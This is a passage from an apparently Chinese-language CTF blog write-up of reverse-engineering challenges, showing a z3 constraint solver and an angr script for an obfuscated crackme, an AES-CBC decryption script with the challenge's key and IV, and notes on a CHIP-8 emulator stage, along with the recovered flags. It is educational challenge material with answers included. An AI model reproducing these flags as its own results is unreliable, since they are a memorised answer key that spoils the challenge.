class="number">4</span>]*<span class="number">22859</span> + flag[<span class="number">7</span>]*<span class="number">116256</span> + flag[<span class="number">3</span>]*<span class="number">122945</span> + flag[<span class="number">6</span>]*<span class="number">25739</span> + flag[<span class="number">1</span>]*-<span class="number">51437</span> + flag[<span class="number">5</span>]*-<span class="number">200702</span> + flag[<span class="number">10</span>]*-<span class="number">86956</span> + flag[<span class="number">12</span>]*<span class="number">220404</span> + flag[<span class="number">8</span>]*-<span class="number">55254</span> + flag[<span class="number">11</span>]*<span class="number">59999</span> ) == -<span class="number">37063008</span>)</span><br><span class="line">solver.add( (flag[<span class="number">8</span>]*<span class="number">300012</span> + flag[<span class="number">12</span>]*-<span class="number">249960</span> + flag[<span class="number">14</span>]*<span class="number">233663</span> + flag[<span class="number">10</span>]*-<span class="number">228149</span> + flag[<span class="number">11</span>]*-<span class="number">88326</span> + flag[<span class="number">1</span>]*<span class="number">144834</span> + flag[<span class="number">6</span>]*<span class="number">67553</span> + flag[<span class="number">2</span>]*-<span class="number">2621</span> + flag[<span class="number">4</span>]*<span class="number">135809</span> + flag[<span class="number">9</span>]*<span class="number">157462</span> + flag[<span class="number">5</span>]*<span class="number">278745</span> + flag[<span class="number">13</span>]*-<span class="number">189890</span> + flag[<span class="number">3</span>]*<span class="number">198502</span> + flag[<span class="number">0</span>]*<span class="number">111310</span> + flag[<span class="number">7</span>]*<span class="number">91783</span> ) == <span class="number">93457153</span>)</span><br><span class="line">solver.add( (flag[<span class="number">7</span>]*<span class="number">114175</span> + flag[<span class="number">1</span>]*-<span class="number">129997</span> + flag[<span class="number">10</span>]*<span class="number">54553</span> + flag[<span class="number">9</span>]*-<span class="number">163572</span> + flag[<span class="number">14</span>]*-<span class="number">48167</span> + flag[<span class="number">6</span>]*<span class="number">148005</span> + flag[<span class="number">11</span>]*<span class="number">230636</span> + flag[<span class="number">4</span>]*-<span class="number">235783</span> + flag[<span class="number">8</span>]*-<span class="number">233813</span> + flag[<span class="number">5</span>]*-<span class="number">181764</span> + flag[<span class="number">12</span>]*<span class="number">104421</span> + flag[<span class="number">2</span>]*<span class="number">125666</span> + flag[<span class="number">3</span>]*<span class="number">194067</span> + flag[<span class="number">13</span>]*-<span class="number">11943</span> + flag[<span class="number">0</span>]*<span class="number">15897</span> + flag[<span class="number">15</span>]*-<span class="number">251681</span> ) == -<span class="number">36640750</span>)</span><br><span class="line">solver.add( (flag[<span class="number">16</span>]*<span class="number">277429</span> + flag[<span class="number">1</span>]*-<span class="number">39495</span> + flag[<span class="number">2</span>]*<span class="number">254969</span> + flag[<span class="number">11</span>]*<span class="number">154844</span> + flag[<span class="number">4</span>]*-<span class="number">1254</span> + flag[<span class="number">5</span>]*-<span class="number">52501</span> + flag[<span class="number">7</span>]*-<span class="number">289940</span> + flag[<span class="number">6</span>]*<span class="number">70051</span> + flag[<span class="number">12</span>]*<span class="number">74128</span> + flag[<span class="number">9</span>]*<span class="number">22454</span> + flag[<span class="number">8</span>]*-<span class="number">68478</span> + flag[<span class="number">13</span>]*<span class="number">272318</span> + flag[<span class="number">15</span>]*-<span class="number">203538</span> + flag[<span class="number">10</span>]*<span class="number">34835</span> + flag[<span class="number">14</span>]*-<span class="number">228520</span> + flag[<span class="number">3</span>]*-<span class="number">90549</span> + flag[<span class="number">0</span>]*-<span class="number">132752</span> ) == -<span class="number">6628237</span>)</span><br><span class="line">solver.add( (flag[<span class="number">7</span>]*-<span class="number">210718</span> + flag[<span class="number">16</span>]*-<span class="number">36680</span> + flag[<span class="number">4</span>]*-<span class="number">112241</span> + flag[<span class="number">14</span>]*<span class="number">10792</span> + flag[<span class="number">15</span>]*<span class="number">55085</span> + flag[<span class="number">1</span>]*-<span class="number">5107</span> + flag[<span class="number">8</span>]*-<span class="number">247882</span> + flag[<span class="number">10</span>]*-<span class="number">94616</span> + flag[<span class="number">12</span>]*-<span class="number">86968</span> + flag[<span class="number">9</span>]*-<span class="number">53271</span> + flag[<span class="number">0</span>]*<span class="number">237987</span> + flag[<span class="number">5</span>]*<span class="number">66107</span> + flag[<span class="number">2</span>]*<span class="number">189050</span> + flag[<span class="number">13</span>]*-<span class="number">148216</span> + flag[<span class="number">3</span>]*-<span class="number">144172</span> + flag[<span class="number">17</span>]*-<span class="number">5873</span> + flag[<span class="number">11</span>]*<span class="number">128092</span> + flag[<span class="number">6</span>]*-<span class="number">249539</span> ) == -<span class="number">53084017</span>)</span><br><span class="line">solver.add( (flag[<span class="number">10</span>]*<span class="number">12264</span> + flag[<span class="number">6</span>]*-<span class="number">280672</span> + flag[<span class="number">0</span>]*<span class="number">134548</span> + flag[<span class="number">11</span>]*<span class="number">175077</span> + flag[<span class="number">4</span>]*-<span class="number">74209</span> + flag[<span class="number">12</span>]*<span class="number">156976</span> + flag[<span class="number">17</span>]*<span class="number">1337</span> + flag[<span class="number">7</span>]*<span class="number">84628</span> + flag[<span class="number">18</span>]*-<span class="number">238861</span> + flag[<span class="number">3</span>]*<span class="number">100397</span> + flag[<span class="number">8</span>]*-<span class="number">155443</span> + flag[<span class="number">15</span>]*<span class="number">272227</span> + flag[<span class="number">16</span>]*<span class="number">58825</span> + flag[<span class="number">14</span>]*<span class="number">145470</span> + flag[<span class="number">1</span>]*<span class="number">195447</span> + flag[<span class="number">5</span>]*-<span class="number">65515</span> + flag[<span class="number">13</span>]*<span class="number">19517</span> + flag[<span class="number">2</span>]*-<span class="number">186088</span> + flag[<span class="number">9</span>]*<span class="number">56937</span> ) == <span class="number">60764977</span>)</span><br><span class="line">solver.add( (flag[<span class="number">2</span>]*<span class="number">139185</span> + flag[<span class="number">1</span>]*-<span class="number">138274</span> + flag[<span class="number">10</span>]*-<span class="number">18520</span> + flag[<span class="number">12</span>]*<span class="number">245858</span> + flag[<span class="number">18</span>]*-<span class="number">36580</span> + flag[<span class="number">15</span>]*<span class="number">162065</span> + flag[<span class="number">4</span>]*-<span class="number">122090</span> + flag[<span class="number">19</span>]*-<span class="number">104395</span> + flag[<span class="number">14</span>]*<span class="number">137214</span> + flag[<span class="number">11</span>]*<span class="number">281718</span> + flag[<span class="number">6</span>]*-<span class="number">170051</span> + flag[<span class="number">17</span>]*<span class="number">137206</span> + flag[<span class="number">3</span>]*<span class="number">176103</span> + flag[<span class="number">8</span>]*-<span class="number">190345</span> + flag[<span class="number">16</span>]*<span class="number">54404</span> + flag[<span class="number">0</span>]*-<span class="number">199631</span> + flag[<span class="number">13</span>]*<span class="number">159144</span> + flag[<span class="number">9</span>]*-<span class="number">283834</span> + flag[<span class="number">7</span>]*-<span class="number">58873</span> + flag[<span class="number">5</span>]*-<span class="number">197535</span> ) == <span class="number">4912728</span>)</span><br><span class="line">solver.add( (flag[<span class="number">12</span>]*-<span class="number">193384</span> + flag[<span class="number">5</span>]*<span class="number">270604</span> + flag[<span class="number">10</span>]*-<span class="number">109205</span> + flag[<span class="number">3</span>]*-<span class="number">39775</span> + flag[<span class="number">4</span>]*-<span class="number">97284</span> + flag[<span class="number">14</span>]*-<span class="number">199427</span> + flag[<span class="number">18</span>]*<span class="number">38137</span> + flag[<span class="number">2</span>]*<span class="number">148338</span> + flag[<span class="number">0</span>]*<span class="number">108149</span> + flag[<span class="number">17</span>]*-<span class="number">28337</span> + flag[<span class="number">1</span>]*-<span class="number">239133</span> + flag[<span class="number">6</span>]*<span class="number">27751</span> + flag[<span class="number">16</span>]*<span class="number">181147</span> + flag[<span class="number">19</span>]*<span class="number">127913</span> + flag[<span class="number">15</span>]*<span class="number">150036</span> + flag[<span class="number">20</span>]*-<span class="number">162393</span> + flag[<span class="number">11</span>]*-<span class="number">72984</span> + flag[<span class="number">8</span>]*<span class="number">74470</span> + flag[<span class="number">13</span>]*<span class="number">63329</span> + flag[<span class="number">9</span>]*<span class="number">293345</span> + flag[<span class="number">7</span>]*<span class="number">168963</span> ) == <span class="number">45577809</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*-<span class="number">38942</span> + flag[<span class="number">13</span>]*-<span class="number">273571</span> + flag[<span class="number">20</span>]*<span class="number">60492</span> + flag[<span class="number">9</span>]*-<span class="number">98937</span> + flag[<span class="number">5</span>]*<span class="number">293201</span> + flag[<span class="number">11</span>]*<span class="number">109605</span> + flag[<span class="number">3</span>]*<span class="number">131692</span> + flag[<span class="number">1</span>]*<span class="number">44675</span> + flag[<span class="number">10</span>]*<span class="number">263208</span> + flag[<span class="number">12</span>]*<span class="number">293781</span> + flag[<span class="number">7</span>]*<span class="number">64641</span> + flag[<span class="number">21</span>]*-<span class="number">207716</span> + flag[<span class="number">15</span>]*<span class="number">153071</span> + flag[<span class="number">4</span>]*<span class="number">179514</span> + flag[<span class="number">14</span>]*-<span class="number">174651</span> + flag[<span class="number">2</span>]*<span class="number">246135</span> + flag[<span class="number">16</span>]*-<span class="number">220539</span> + flag[<span class="number">8</span>]*-<span class="number">188979</span> + flag[<span class="number">19</span>]*<span class="number">244009</span> + flag[<span class="number">17</span>]*<span class="number">111858</span> + flag[<span class="number">6</span>]*<span class="number">45637</span> + flag[<span class="number">18</span>]*-<span class="number">285946</span> ) == <span class="number">77539017</span>)</span><br><span class="line">solver.add( (flag[<span class="number">5</span>]*-<span class="number">71444</span> + flag[<span class="number">7</span>]*-<span class="number">130852</span> + flag[<span class="number">2</span>]*<span class="number">255675</span> + flag[<span class="number">16</span>]*<span class="number">59119</span> + flag[<span class="number">8</span>]*-<span class="number">258754</span> + flag[<span class="number">12</span>]*<span class="number">9791</span> + flag[<span class="number">3</span>]*<span class="number">76213</span> + flag[<span class="number">14</span>]*<span class="number">105293</span> + flag[<span class="number">21</span>]*-<span class="number">148390</span> + flag[<span class="number">1</span>]*-<span class="number">194890</span> + flag[<span class="number">10</span>]*-<span class="number">141434</span> + flag[<span class="number">6</span>]*-<span class="number">43684</span> + flag[<span class="number">17</span>]*-<span class="number">21957</span> + flag[<span class="number">13</span>]*-<span class="number">197632</span> + flag[<span class="number">0</span>]*-<span class="number">58530</span> + flag[<span class="number">15</span>]*<span class="number">295735</span> + flag[<span class="number">22</span>]*<span class="number">92896</span> + flag[<span class="number">20</span>]*-<span class="number">86224</span> + flag[<span class="number">11</span>]*-<span class="number">206184</span> + flag[<span class="number">4</span>]*<span class="number">32897</span> + flag[<span class="number">18</span>]*<span class="number">234971</span> + flag[<span class="number">9</span>]*-<span class="number">160726</span> + flag[<span class="number">19</span>]*<span class="number">127285</span> ) == -<span class="number">38197685</span>)</span><br><span class="line">solver.add( (flag[<span class="number">9</span>]*-<span class="number">291063</span> + flag[<span class="number">18</span>]*<span class="number">191404</span> + flag[<span class="number">2</span>]*-<span class="number">60213</span> + flag[<span class="number">8</span>]*-<span class="number">133696</span> + flag[<span class="number">22</span>]*<span class="number">89330</span> + flag[<span class="number">0</span>]*<span class="number">196370</span> + flag[<span class="number">12</span>]*-<span class="number">44618</span> + flag[<span class="number">16</span>]*<span class="number">175825</span> + flag[<span class="number">11</span>]*<span class="number">281705</span> + flag[<span class="number">21</span>]*-<span class="number">238839</span> + flag[<span class="number">15</span>]*-<span class="number">188959</span> + flag[<span class="number">19</span>]*-<span class="number">180522</span> + flag[<span class="number">5</span>]*-<span class="number">211930</span> + flag[<span class="number">7</span>]*<span class="number">103466</span> + flag[<span class="number">6</span>]*-<span class="number">40848</span> + flag[<span class="number">23</span>]*<span class="number">191822</span> + flag[<span class="number">3</span>]*<span class="number">268813</span> + flag[<span class="number">17</span>]*-<span class="number">236806</span> + flag[<span class="number">14</span>]*<span class="number">202621</span> + flag[<span class="number">10</span>]*<span class="number">120347</span> + flag[<span class="number">4</span>]*<span class="number">144870</span> + flag[<span class="number">1</span>]*<span class="number">197685</span> + flag[<span class="number">20</span>]*<span class="number">205675</span> + flag[<span class="number">13</span>]*<span class="number">13902</span> ) == <span class="number">67763764</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*-<span class="number">85246</span> + flag[<span class="number">6</span>]*<span class="number">91076</span> + flag[<span class="number">17</span>]*<span class="number">37665</span> + flag[<span class="number">19</span>]*-<span class="number">243227</span> + flag[<span class="number">2</span>]*<span class="number">14439</span> + flag[<span class="number">12</span>]*-<span class="number">8509</span> + flag[<span class="number">11</span>]*<span class="number">9601</span> + flag[<span class="number">24</span>]*-<span class="number">94067</span> + flag[<span class="number">23</span>]*-<span class="number">199130</span> + flag[<span class="number">13</span>]*-<span class="number">161113</span> + flag[<span class="number">18</span>]*-<span class="number">210563</span> + flag[<span class="number">20</span>]*-<span class="number">268221</span> + flag[<span class="number">5</span>]*-<span class="number">54321</span> + flag[<span class="number">7</span>]*<span class="number">234832</span> + flag[<span class="number">9</span>]*<span class="number">115189</span> + flag[<span class="number">14</span>]*-<span class="number">173902</span> + flag[<span class="number">16</span>]*<span class="number">7838</span> + flag[<span class="number">22</span>]*<span class="number">115716</span> + flag[<span class="number">3</span>]*-<span class="number">261617</span> + flag[<span class="number">1</span>]*-<span class="number">78459</span> + flag[<span class="number">8</span>]*<span class="number">29334</span> + flag[<span class="number">10</span>]*<span class="number">62004</span> + flag[<span class="number">21</span>]*-<span class="number">19740</span> + flag[<span class="number">15</span>]*<span class="number">69341</span> + flag[<span class="number">4</span>]*<span class="number">39558</span> ) == -<span class="number">98330271</span>)</span><br><span class="line">solver.add( (flag[<span class="number">15</span>]*<span class="number">226192</span> + flag[<span class="number">18</span>]*<span class="number">197710</span> + flag[<span class="number">10</span>]*-<span class="number">124307</span> + flag[<span class="number">14</span>]*-<span class="number">73366</span> + flag[<span class="number">7</span>]*<span class="number">92844</span> + flag[<span class="number">23</span>]*<span class="number">41768</span> + flag[<span class="number">13</span>]*<span class="number">10191</span> + flag[<span class="number">21</span>]*-<span class="number">271816</span> + flag[<span class="number">9</span>]*-<span class="number">35931</span> + flag[<span class="number">17</span>]*-<span class="number">242059</span> + flag[<span class="number">25</span>]*<span class="number">247654</span> + flag[<span class="number">6</span>]*<span class="number">263000</span> + flag[<span class="number">4</span>]*-<span class="number">65268</span> + flag[<span class="number">0</span>]*<span class="number">232645</span> + flag[<span class="number">12</span>]*-<span class="number">81477</span> + flag[<span class="number">5</span>]*<span class="number">180400</span> + flag[<span class="number">16</span>]*-<span class="number">212633</span> + flag[<span class="number">20</span>]*-<span class="number">78437</span> + flag[<span class="number">1</span>]*-<span class="number">111200</span> + flag[<span class="number">8</span>]*-<span class="number">260264</span> + flag[<span class="number">24</span>]*<span class="number">32044</span> + flag[<span class="number">3</span>]*-<span class="number">252915</span> + flag[<span class="number">22</span>]*<span class="number">169299</span> + flag[<span class="number">2</span>]*-<span class="number">75568</span> + flag[<span class="number">19</span>]*<span class="number">38468</span> + flag[<span class="number">11</span>]*<span class="number">3788</span> ) == -<span class="number">13464859</span>)</span><br><span class="line">solver.add( (flag[<span class="number">10</span>]*-<span class="number">155664</span> + flag[<span class="number">1</span>]*-<span class="number">206964</span> + flag[<span class="number">16</span>]*-<span class="number">166693</span> + flag[<span class="number">17</span>]*-<span class="number">293146</span> + flag[<span class="number">19</span>]*-<span class="number">213665</span> + flag[<span class="number">26</span>]*-<span class="number">253617</span> + flag[<span class="number">0</span>]*-<span class="number">121854</span> + flag[<span class="number">7</span>]*-<span class="number">84952</span> + flag[<span class="number">18</span>]*-<span class="number">153409</span> + flag[<span class="number">8</span>]*<span class="number">83918</span> + flag[<span class="number">20</span>]*-<span class="number">78913</span> + flag[<span class="number">13</span>]*<span class="number">271210</span> + flag[<span class="number">4</span>]*<span class="number">219151</span> + flag[<span class="number">3</span>]*<span class="number">186585</span> + flag[<span class="number">2</span>]*<span class="number">77915</span> + flag[<span class="number">6</span>]*<span class="number">231326</span> + flag[<span class="number">22</span>]*<span class="number">215574</span> + flag[<span class="number">25</span>]*-<span class="number">6866</span> + flag[<span class="number">5</span>]*<span class="number">77693</span> + flag[<span class="number">12</span>]*<span class="number">116581</span> + flag[<span class="number">21</span>]*-<span class="number">74795</span> + flag[<span class="number">14</span>]*-<span class="number">15606</span> + flag[<span class="number">23</span>]*-<span class="number">102361</span> + flag[<span class="number">15</span>]*-<span class="number">254282</span> + flag[<span class="number">24</span>]*-<span class="number">188087</span> + flag[<span class="number">9</span>]*-<span class="number">23897</span> + flag[<span class="number">11</span>]*<span class="number">180598</span> ) == -<span class="number">55504393</span>)</span><br><span class="line">solver.add( (flag[<span class="number">16</span>]*<span class="number">167885</span> + flag[<span class="number">1</span>]*<span class="number">258890</span> + flag[<span class="number">17</span>]*-<span class="number">109447</span> + flag[<span class="number">24</span>]*<span class="number">231264</span> + flag[<span class="number">15</span>]*<span class="number">98136</span> + flag[<span class="number">20</span>]*-<span class="number">113009</span> + flag[<span class="number">6</span>]*-<span class="number">106792</span> + flag[<span class="number">19</span>]*<span class="number">147747</span> + flag[<span class="number">22</span>]*<span class="number">138998</span> + flag[<span class="number">18</span>]*<span class="number">88628</span> + flag[<span class="number">26</span>]*<span class="number">6966</span> + flag[<span class="number">8</span>]*-<span class="number">14347</span> + flag[<span class="number">2</span>]*-<span class="number">136952</span> + flag[<span class="number">4</span>]*-<span class="number">225830</span> + flag[<span class="number">25</span>]*<span class="number">167370</span> + flag[<span class="number">3</span>]*-<span class="number">164339</span> + flag[<span class="number">5</span>]*<span class="number">77375</span> + flag[<span class="number">10</span>]*-<span class="number">120743</span> + flag[<span class="number">14</span>]*-<span class="number">143324</span> + flag[<span class="number">27</span>]*-<span class="number">38949</span> + flag[<span class="number">0</span>]*<span class="number">157781</span> + flag[<span class="number">21</span>]*<span class="number">40423</span> + flag[<span class="number">7</span>]*<span class="number">138308</span> + flag[<span class="number">23</span>]*-<span class="number">132906</span> + flag[<span class="number">9</span>]*<span class="number">278196</span> + flag[<span class="number">12</span>]*<span class="number">135302</span> + flag[<span class="number">11</span>]*<span class="number">264405</span> + flag[<span class="number">13</span>]*<span class="number">246315</span> ) == <span class="number">133068723</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = [ <span class="built_in">chr</span>( model[flag[i]].as_long() ) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>) ]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(result))</span><br><span class="line"><span class="comment">#flag&#123;g0_Fuck_xx_5egm3nt_0bf&#125;</span></span><br></pre></td></tr></table></figure>

<p>在网上搜到题解还有一种使用angr的方法，也记录一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line">p = angr.Project(<span class="string">&quot;D:\\ahhh\\qwb\\mytest\\2020\\xx_warmup_obf\\xx_warmup_obf&quot;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = p.factory.blank_state(addr=<span class="number">0x402D10</span>) <span class="comment">#入口</span></span><br><span class="line">tmp_addr = <span class="number">0x20000</span></span><br><span class="line">ans = claripy.BVS(<span class="string">&#x27;ans&#x27;</span>, <span class="number">8</span> * <span class="number">28</span>)</span><br><span class="line">state.memory.store(tmp_addr, ans)</span><br><span class="line">state.regs.rax = <span class="number">0x20000</span></span><br><span class="line">sm = p.factory.simgr(state)</span><br><span class="line"><span class="keyword">for</span> byt <span class="keyword">in</span> ans.chop(<span class="number">8</span>):</span><br><span class="line">    state.add_constraints(state.solver.And(byt &gt;= <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>),byt &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;~&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">find=[<span class="number">0x408470</span>] <span class="comment"># 目标(正常运行如果所有字符都判断正确就会调到这里)</span></span><br><span class="line">avoid=[<span class="number">0x402D2F</span>,<span class="number">0x402F96</span>,<span class="number">0x4032C5</span>,<span class="number">0x4034B6</span>,<span class="number">0x4035CF</span>,<span class="number">0x403728</span>,<span class="number">0x4039D4</span>,<span class="number">0x403B27</span>,<span class="number">0x403CB9</span>,<span class="number">0x403E34</span>,<span class="number">0x40418F</span>,<span class="number">0x40459C</span>,<span class="number">0x4048FE</span>, <span class="number">0x404C6D</span>,<span class="number">0x0405051</span>,<span class="number">0x0405286</span>,<span class="number">0x0405594</span> ,<span class="number">0x04057EF</span>,<span class="number">0x0405B96</span>,<span class="number">0x406057</span>,<span class="number">0x0406537</span>,<span class="number">0x0406931</span> ,<span class="number">0x0406DA9</span>,<span class="number">0x407069</span>,<span class="number">0x407606</span>,<span class="number">0x040790B</span>,<span class="number">0x0407D8F</span>,<span class="number">0x4081B4</span>,] <span class="comment">#限制</span></span><br><span class="line">sm.explore(find=find,avoid=avoid)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    solution_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    solution_bytes = solution_state.solver.<span class="built_in">eval</span>(ans,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    solution = solution_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> (solution)</span><br></pre></td></tr></table></figure>

<p><img src="/1763434247558-5.png" alt="img"></p>
<p>用angr就少了提取28个方程参数的繁琐步骤，简单一些</p>
<p>flag{g0_Fuck_xx_5egm3nt_0bf}</p>
<h1 id="2020-re-imitation-game"><a href="#2020-re-imitation-game" class="headerlink" title="2020 re imitation_game"></a>2020 re imitation_game</h1><p>存在父进程调用子进程的逻辑，使用了fork函数</p>
<p>程序存在花指令，去除之后，反汇编main函数</p>
<p><img src="/1763434247558-6.png" alt="img"></p>
<p><img src="/1763434247558-7.png" alt="img"></p>
<p>flag分为两部分，同样验证方法也有两部分，首先第一部分是AES-CBC加密，这个程序动调我一直调不出来这个AES加密逻辑，实际上它是起了一个子进程用于运行这个加密和对比流程，将输入进去的数据进行AES加密之后与unk_562406204048处的值进行对比，对比后向父进程发送信号，如果成功则进入第二阶段，失败则直接返回”no”然后程序结束。</p>
<p><img src="/1763434247558-8.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">9D7BA23CB1099A4841D16663D6AE3CABB825A9AE8B4AA6D17DC4B22AB35DE3D52B30509AD2881091771F0D86A2D3D6E16E24E94EF3F116050745EFD606454F3D    //加密后结果</span><br><span class="line">3E2C251318BEC36BA1372453031E51EC   //密钥</span><br><span class="line">202122232425262728292A2B2C2D2E2F   // IV</span><br></pre></td></tr></table></figure>

<p><img src="/1763434247558-9.png" alt="img"></p>
<p>用chefcrypt就可以解密，当然热可以写个脚本来解：</p>
<p><img src="/1763434247558-10.png" alt="img"></p>
<p>ASE-CBC加解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_to_16</span>(<span class="params">text</span>):</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">       add = <span class="number">16</span> - (<span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       add = <span class="number">0</span></span><br><span class="line">   text = text + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line">   <span class="keyword">return</span> text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">   key = <span class="string">b&quot;\x3E\x2C\x25\x13\x18\xBE\xC3\x6B\xA1\x37\x24\x53\x03\x1E\x51\xEC&quot;</span></span><br><span class="line">   iv = <span class="string">b&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F&quot;</span></span><br><span class="line">   mode = AES.MODE_CBC</span><br><span class="line">   text = add_to_16(text)</span><br><span class="line">   cryptos = AES.new(key, mode, iv)</span><br><span class="line">   cipher_text = cryptos.encrypt(text)</span><br><span class="line">   <span class="keyword">return</span> b2a_hex(cipher_text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text</span>):</span><br><span class="line"></span><br><span class="line">   key = a2b_hex(<span class="string">b&quot;3E2C251318BEC36BA1372453031E51EC&quot;</span>)</span><br><span class="line">   iv = a2b_hex(<span class="string">b&quot;202122232425262728292A2B2C2D2E2F&quot;</span>)</span><br><span class="line">   mode = AES.MODE_CBC</span><br><span class="line">   cryptos = AES.new(key, mode, iv)</span><br><span class="line">   <span class="built_in">print</span>(a2b_hex(text))</span><br><span class="line">   plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">   <span class="keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   e = encrypt(<span class="string">&quot;6c8f1d78770fe672122478c6f9a150e8\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a&quot;</span>)</span><br><span class="line"></span><br><span class="line">   d = decrypt(<span class="string">b&quot;9D7BA23CB1099A4841D16663D6AE3CABB825A9AE8B4AA6D17DC4B22AB35DE3D52B30509AD2881091771F0D86A2D3D6E16E24E94EF3F116050745EFD606454F3D&quot;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;加密:&quot;</span>, e)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;解密:&quot;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># a=&#x27;20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F&#x27;</span></span><br><span class="line"><span class="comment"># a=a.replace(&#x27; &#x27;,&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6c8f1d78770fe672122478c6f9a150e1</span></span><br></pre></td></tr></table></figure>

<p>解得第一部分为：<em>6c8f1d78770fe672122478c6f9a150e1</em></p>
<p>输入之后就可以看到第二部分运行起来是个窗口，可以在里面输入十个16进制数值，输入完毕之后直接给个”DEAD”出来，那也就是说flag第二部分只有十位数值</p>
<p>第二部分当时题目应该是给提示了，是启动了一个chip-8模拟器，加载game.bin运行了一个游戏</p>
<p><img src="/1763434247558-11.png" alt="img"></p>
<p><img src="/1763434247558-12.png" alt="img"></p>
<p>所以主要逻辑应该就在game.bin文件里面，但是它是chip8指令集，ida解析不了，上网上搜索题解发现有用工具解决的，也有根据指令集自己编写代码来反汇编的，工具如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/172217">https://www.anquanke.com/post/id/172217</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/drguildo/CHIP8Decompiler">https://github.com/drguildo/CHIP8Decompiler</a></p>
<p>脚本如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mattmikolay/chip-8/wiki/CHIP%E2%80%908-Instruction-Set">https://github.com/mattmikolay/chip-8/wiki/CHIP%E2%80%908-Instruction-Set</a></p>
